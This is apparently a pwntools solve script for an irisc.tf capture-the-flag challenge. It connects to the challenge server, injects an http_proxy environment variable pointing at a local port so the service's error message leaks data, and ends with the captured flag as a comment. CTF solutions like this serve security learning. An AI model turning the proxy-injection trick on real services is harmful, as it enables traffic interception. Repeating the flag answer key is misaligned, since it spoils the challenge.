from pwn import *

if __name__ == "__main__":
    if args.REMOTE:
        context.log_level = 'debug'
        r = remote("host.chal.irisc.tf", 10300)
        r.recvuntil("with:\n")
        pow_cmd = r.recvline().strip().decode()
        r.recvuntil("? ")

        print(pow_cmd)
        pow_ans = input().strip()
        r.sendline(pow_ans.encode())

    print(r.recvuntil("> "))
    r.sendline(b"1")
    r.recvuntil("Name? ")
    r.sendline(b"http_proxy")
    r.recvuntil("Value? ")
    r.sendline(b"http://0:25566")
    print(r.recvuntil("> "))
    r.sendline(b"1")
    r.interactive()
# irisctf{very_helpful_error_message}
